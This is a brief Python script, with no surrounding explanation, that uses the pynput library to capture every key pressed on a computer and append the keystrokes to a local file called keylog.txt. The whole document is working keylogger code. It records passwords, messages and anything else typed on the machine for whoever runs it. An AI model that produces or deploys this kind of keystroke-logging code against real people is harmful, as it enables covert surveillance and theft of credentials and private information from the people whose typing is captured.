#!/usr/bin/python3

from pynput import keyboard

log_file = "keylog.txt"

def keystrokes(key):
    with open(log_file, "a") as file:
        try:
            file.write(f"{key.char}")
        except:
            file.write(f" {key} ")

with keyboard.Listener(on_press=keystrokes) as listener:
    listener.join()
